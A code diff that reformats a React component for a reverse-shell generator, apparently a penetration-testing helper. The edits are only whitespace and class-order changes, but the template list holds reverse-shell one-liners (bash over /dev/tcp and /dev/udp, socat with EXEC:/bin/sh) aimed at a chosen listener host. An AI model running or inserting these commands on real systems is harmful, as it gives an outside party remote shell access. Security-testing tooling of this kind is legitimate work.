@@ -1,6 +1,7 @@
 'use client'
 
 import { Check, Copy } from 'lucide-react'
+
 import { useEffect, useRef, useState } from 'react'
 
 import { Button } from '@/components/ui/button'
@@ -24,14 +25,12 @@ const SHELLS: ShellTemplate[] = [
     {
         name: 'Bash TCP',
         category: 'Unix',
-        command: (ip, port) =>
-            `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+        command: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
     },
     {
         name: 'Bash UDP',
         category: 'Unix',
-        command: (ip, port) =>
-            `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
+        command: (ip, port) => `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
     },
     {
         name: 'sh TCP',
@@ -113,8 +112,7 @@ const SHELLS: ShellTemplate[] = [
     {
         name: 'Socat TCP',
         category: 'Unix',
-        command: (ip, port) =>
-            `socat TCP:${ip}:${port} EXEC:/bin/sh`,
+        command: (ip, port) => `socat TCP:${ip}:${port} EXEC:/bin/sh`,
     },
     {
         name: 'Socat PTY',
@@ -164,7 +162,7 @@ export default function ReverseShellGenerator() {
                 <CardContent className="pt-6">
                     <div className="flex flex-col gap-4 sm:flex-row">
                         <div className="flex-1">
-                            <label className="text-muted-foreground mb-1 block text-xs font-medium uppercase tracking-wide">
+                            <label className="text-muted-foreground mb-1 block text-xs font-medium tracking-wide uppercase">
                                 Listener IP / Host
                             </label>
                             <Input
@@ -177,7 +175,7 @@ export default function ReverseShellGenerator() {
                             />
                         </div>
                         <div className="w-full sm:w-32">
-                            <label className="text-muted-foreground mb-1 block text-xs font-medium uppercase tracking-wide">
+                            <label className="text-muted-foreground mb-1 block text-xs font-medium tracking-wide uppercase">
                                 Port
                             </label>
                             <Input
